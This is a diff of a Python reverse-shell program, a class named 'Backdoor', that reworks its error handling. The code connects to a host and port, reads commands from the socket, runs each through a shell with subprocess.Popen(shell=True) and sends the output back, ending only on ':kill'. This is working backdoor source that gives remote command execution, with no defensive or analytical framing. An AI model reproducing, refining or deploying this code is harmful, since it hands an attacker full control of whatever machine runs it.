@@ -19,30 +19,27 @@ class Backdoor(object):
                 return True
 
     def code(self):
-        try:
-            while True:
-                self.__sock.send('#>'.encode())
-                data = self.__sock.recv(1024).decode().strip()
+        while True:
+            self.__sock.send('#>'.encode())
+            data = self.__sock.recv(1024).decode().strip()
 
-                if data == ':kill':
-                    break
+            if data == ':kill':
+                break
 
-                proc = subprocess.Popen(
-                    data,
-                    shell = True,
-                    stdin = subprocess.PIPE,
-                    stdout = subprocess.PIPE,
-                    stderr = subprocess.PIPE)
+            proc = subprocess.Popen(
+                data,
+                shell = True,
+                stdin = subprocess.PIPE,
+                stdout = subprocess.PIPE,
+                stderr = subprocess.PIPE)
 
-                stdout = proc.stdout.read().decode()
-                stderr = proc.stderr.read().decode()
-                out = stdout
-                if stderr != '':
-                    out = stderr
+            stdout = proc.stdout.read().decode()
+            stderr = proc.stderr.read().decode()
+            out = stdout
+            if stderr != '':
+                out = stderr
 
-                self.__sock.send(out.encode())
-        except:
-            pass
+            self.__sock.send(out.encode())
 
     def open(self):
         self.__sock.connect((self.__host, self.__port))
@@ -51,4 +48,7 @@ class Backdoor(object):
         self.code()
 
 if __name__ == '__main__':
-    Backdoor('127.0.0.1', 8080, 'sys').open()
+    try:
+        Backdoor('127.0.0.1', 8080, 'sys').open()
+    except:
+        os._exit(1)
